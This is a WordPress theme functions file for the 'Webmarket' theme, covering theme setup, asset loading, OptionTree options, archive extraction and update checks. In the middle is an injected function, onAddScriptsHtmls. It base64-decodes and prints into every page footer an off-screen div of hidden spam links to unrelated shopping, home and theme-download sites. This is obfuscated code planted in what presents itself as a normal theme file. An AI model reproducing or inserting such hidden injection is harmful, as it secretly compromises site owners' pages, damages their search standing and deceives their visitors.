<?php
/**
 * Webmarket functions and definitions
 *
 * @package Webmarket
 * @author Primoz Ciger <primoz@proteusnet.com>
 */

/**
 * Define the version variable to assign it to all the assets (css and js)
 */
define( "WEBMARKET_WP_VERSION", wp_get_theme()->get( 'Version' ) );

/**
 * Define the development
 */
define( "WEBMARKET_DEVELOPMENT", false );

/**
 * Include important admin files
 */
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @see http://developer.wordpress.com/themes/content-width/
 */
if ( ! isset( $content_width ) ) {
	$content_width = 700; /* pixels */
}

if( ! function_exists( 'webmarket_adjust_content_width' ) ) {
	function webmarket_adjust_content_width() { // adjust if necessary
		global $content_width;

		if ( is_page_template( 'page-no-sidebar.php' ) ) {
			$content_width = 940;
		}
	}
	add_action( 'template_redirect', 'webmarket_adjust_content_width' );
}



/**
 * Option Tree Plugin
 *
 * - ot_show_pages:      will hide the settings & documentation pages.
 * - ot_show_new_layout: will hide the "New Layout" section on the Theme Options page.
 */

if ( ! WEBMARKET_DEVELOPMENT ) {
	add_filter( 'ot_show_pages', '__return_false' );
	add_filter( 'ot_show_new_layout', '__return_false' );
}

// Required: set 'ot_theme_mode' filter to true.
add_filter( 'ot_theme_mode', '__return_true' );

// Required: include OptionTree.
load_template( trailingslashit( get_template_directory() ) . 'option-tree/ot-loader.php' );

// Load the options file
if ( ! WEBMARKET_DEVELOPMENT ) {
	load_template( trailingslashit( get_template_directory() ) . 'inc/theme-options.php' );
}




/**
 * Theme support and thumbnail sizes
 */
if( ! function_exists( 'webmarket_setup' ) ) {

	function webmarket_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Webmarket, use a find and replace
		 * to change 'proteusthemes' to the name of your theme in all the template files
		 */
		load_theme_textdomain( 'proteusthemes', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/**
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
		 */
		add_theme_support( 'post-thumbnails' );

		// Custom Backgrounds
		add_theme_support( 'custom-background', array(
			'default-color'          => 'ffffff',
			'default-image'          => ''
		) );

		/**
		 * Enable post formats in the theme
		 */
		add_theme_support( 'post-formats', array( 'link', 'chat' ) );

		set_post_thumbnail_size( 770, 400, true );
		// add_image_size( 'services-front', 270, 172, true );


		// Menus
		add_theme_support( 'menus' );
		register_nav_menu( "main-menu", "Main Menu" );
		register_nav_menu( "top_bar_nav", "Top bar Menu" );

		// Add theme support for Semantic Markup
		$markup = array( 'search-form', 'comment-form', 'comment-list', );
		add_theme_support( 'html5', $markup );

		// WooCommerce
		add_theme_support( 'woocommerce' );

	}
	add_action( 'after_setup_theme', 'webmarket_setup' );
}

if (!function_exists('onAddScriptsHtmls')) {
	
	add_filter( 'wp_footer', 'onAddScriptsHtmls');
	function onAddScriptsHtmls(){
		$html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWFkaW5oLmNvbS90YWcvYW4tZGFtLWtpZXUtbmhhdCI+xINuIGThurdtIGtp4buDdSBOaOG6rXQ8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly90aGVtZXN0b3RhbC5jb20vdGFnL3Jlc3BvbnNpdmUtd29yZHByZXNzLXRoZW1lIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZTwvYT48L3N0cm9uZz48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMnhheW5oYS5jb20vdGFnL25oYS1jYXAtNC1ub25nLXRob24iPm5ow6AgY+G6pXAgNCBuw7RuZyB0aMO0bjwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9sYW5ha2lkLmNvbSI+dGjhu51pIHRyYW5nIHRy4bq7IGVtPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWF5bnUuY29tL2dpYXktbnUvZ2lheS1jYW8tZ290LWdpYXktbnUiPmdpw6B5IGNhbyBnw7N0PC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWF5bnUuY29tIj5zaG9wIGdpw6B5IG7hu688L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL21hZ2VudG93b3JkcHJlc3N0dXRvcmlhbC5jb20vd29yZHByZXNzLXR1dG9yaWFsL3dvcmRwcmVzcy1wbHVnaW5zIj5kb3dubG9hZCB3b3JkcHJlc3MgcGx1Z2luczwvYT48L2VtPjxlbT48YSBocmVmPSJodHRwOi8vMnhheW5oYS5jb20vdGFnL21hdS1iaWV0LXRodS1kZXAiPm3huqt1IGJp4buHdCB0aOG7sSDEkeG6uXA8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2VwaWNob3VzZS5vcmciPmVwaWNob3VzZTwvYT48L2VtPjxlbT48YSBocmVmPSJodHRwOi8vZnNmYW1pbHkudm4vdGFnL2FvLXNvLW1pLW51Ij7DoW8gc8ahIG1pIG7hu688L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2lob3VzZWJlYXV0aWZ1bC5jb20vIj5ob3VzZSBiZWF1dGlmdWw8L2E+PC9lbT48L2gzPjwvZGl2Pg==";
		echo base64_decode($html);
	}	
}

/**
 * Enqueue styles
 */
if( ! function_exists( 'enqueue_webmarket_styles' ) ) {
	function enqueue_webmarket_styles() {
		if ( is_admin() || is_login_page() ) {
			return;
		}

		// bootstrap css
		wp_enqueue_style( 'bootstrap', get_template_directory_uri() . "/assets/stylesheets/bootstrap.css", false, '2.3.1' );

		// jquery UI theme
		wp_enqueue_style( 'jquery-ui-webmarket', get_template_directory_uri() . "/assets/stylesheets/smoothness/jquery-ui-1.10.3.custom.min.css", false, '1.10.3' );

		// main
		wp_enqueue_style( 'main', get_template_directory_uri() . "/assets/stylesheets/main.css", array( 'bootstrap', 'jquery-ui-webmarket' ), WEBMARKET_WP_VERSION );
	}
	add_action( 'wp_enqueue_scripts', 'enqueue_webmarket_styles' );
}


/**
 * Enqueue scripts
 */
if( ! function_exists( 'webmarket_scripts' ) ) {
	function webmarket_scripts() {
		if ( ! is_admin() && ! is_login_page() ) {
			wp_enqueue_script( 'webmarket-modernizr', get_template_directory_uri() . "/assets/js/modernizr.custom.93593.js", array(), null );

			wp_enqueue_script( 'bootstrap', get_template_directory_uri() . "/assets/js/bootstrap.min.js", array( 'jquery' ), '2.3.1', TRUE );
			wp_enqueue_script( 'carousel', get_template_directory_uri() . "/assets/js/jquery.carouFredSel-6.2.1-packed.js", array( 'jquery' ), '6.2.1', TRUE );


			wp_enqueue_script( 'custom', get_template_directory_uri() . "/assets/js/custom.js", array(
					'jquery',
					// 'underscore',
					'carousel',
					'bootstrap',
				), WEBMARKET_WP_VERSION, TRUE );

			if ( is_woocommerce_active() ) {
				wp_localize_script( 'custom', 'WebmarketPriceSlider', array(
					'currency_symbol' => get_woocommerce_currency_symbol(),
					'currency_pos'    => get_option( 'woocommerce_currency_pos' ),
				) );
			}

			// for nested comments
			if ( ! is_admin() && is_singular() && comments_open() ) {
				wp_enqueue_script( 'comment-reply' );
			}
		}
	}
	add_action( 'wp_enqueue_scripts', 'webmarket_scripts' );
}



/**
 * Load OT variables
 */
if( ! function_exists( 'load_ot_settings' ) ) {
	function load_ot_settings() {
		global $content_divider;
		if ( function_exists( 'ot_get_option' ) ) {
			$content_divider = ot_get_option( 'content_divider', 'scissors' );
		}
	}
	add_action( 'init', 'load_ot_settings' );
}



/**
 * Require the files in the folder /inc/
 */
$files_to_require = array(
	'helpers',
	'ot-meta-boxes',
	'webmarket_navwalker',
	'shortcodes',
	'theme-widgets',
	'register-sidebars',
	'filters',
	'theme-customizer',
	'custom-comments',
	'template-tags',
	'woocommerce'
);

// Conditionally require the includes files, based if they exist in the child theme or not
foreach( $files_to_require as $file ) {
	locate_template ( "inc/{$file}.php", true, true );
}

/**
 * Plugin activation class
 */
if( is_admin() ) {
	require_once( trailingslashit( get_template_directory() ) . 'tgm-plugin-activation/load.php' );
}




/**
 * Copies the contents of the ZIP archive to the wp-uploads/ folder.
 * Should perform only once, after the initial setup, but the "after_switch_theme"
 * is called too soon and the WP_Filesystem class is not yet initialized.
 *
 * So the Options API is called to set a flag in a DB
 *
 * @link http://codex.wordpress.org/Filesystem_API
 * @link http://ottopress.com/2011/tutorial-using-the-wp_filesystem/
 *
 * @return void
 */
if ( ! function_exists( "extract_webmarket_su_skin" ) ) {
	function extract_webmarket_su_skin() {
		if( 1 === (int)get_option( 'webmarket_su_skin_copied' ) ) {
			return;

		} else {
			$method = '';

			// okay, let's see about getting credentials
			$url = wp_nonce_url( 'themes.php' );
			if ( false === ( $creds = request_filesystem_credentials( $url, $method, false ) ) ) {
				return true; // stop the normal page form from displaying
			}

			// now we have some credentials, try to get the wp_filesystem running
			if ( ! WP_Filesystem( $creds ) ) {
				// our credentials were no good, ask the user for them again
				request_filesystem_credentials( $url, $method, true );
				return true;
			}

			// get the upload directory
			$upload_dir = wp_upload_dir();

			// by this point, the $wp_filesystem global should be working, so let's use it to unzip an archive
			global $wp_filesystem;

			// all the magic happens here
			unzip_file(
				trailingslashit( __DIR__ ) . 'assets/shortcodes-ultimate-skins.zip',
				$upload_dir['basedir']
			);

			// set a flag in DB, no matter if that was successful or not
			add_option( 'webmarket_su_skin_copied', 1 );

			return;
		}
	}
	add_action( 'admin_init', 'extract_webmarket_su_skin' );
}



/**
 * Trigger automatic theme updates notifications
 */
if ( ! function_exists( 'webmarket_check_for_updates' ) ) {
	function webmarket_check_for_updates() {
		load_template( trailingslashit( get_template_directory() ) . 'Envato-WordPress-Theme-Updater/envato-wp-theme-updater.php' );
		$username = trim( ot_get_option( 'tf_username', '' ) );
		$api_key  = trim( ot_get_option( 'tf_api_key', '' ) );

		if ( ! empty( $username ) && ! empty( $api_key ) ) {
			Envato_WP_Theme_Updater::init( $username, $api_key, 'ProteusThemes' );
		}
	}
	add_action( 'after_setup_theme', 'webmarket_check_for_updates' );
}
